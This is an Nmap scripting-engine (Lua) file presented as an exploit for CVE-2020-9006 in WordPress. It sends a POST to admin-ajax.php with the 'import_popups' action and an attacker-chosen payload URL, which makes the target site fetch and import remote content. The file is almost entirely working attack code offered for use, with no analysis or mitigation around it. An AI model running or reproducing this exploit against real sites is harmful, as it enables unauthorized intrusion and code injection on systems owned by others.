local http = require 'http'
local shortport = require 'shortport'
local stdnse = require 'stdnse'

description = [[
  CVE-2020-9006 exploit by s3rgeym

  Args:
    http.useragent  User-Agent string
    payload-url     Payload URL
]]

author = 'Sergey M <yamldeveloper@proton.me>'
license = 'Same as Nmap--See http://nmap.org/book/man-legal.html'
categories = {'vuln'}

portrule = shortport.port_or_service({80, 443}, {'http', 'https'})

local function fail(err) return stdnse.format_output(false, err) end

action = function(host, port)
  local payload_url = stdnse.get_script_args('payload-url')
  stdnse.debug1(('payload_url: %q'):format(payload_url))
  local postdata = {
    action = 'import_popups',
    attachmentUrl = payload_url
  }
  local response = http.post(host, port, '/wp-admin/admin-ajax.php', nil, nil, postdata)
  if not response then
    return fail('request failed')
  end
  if response.status ~= 200 then
    return fail(('bad status: %q'):format(response.status))
  end
  return response.body
end
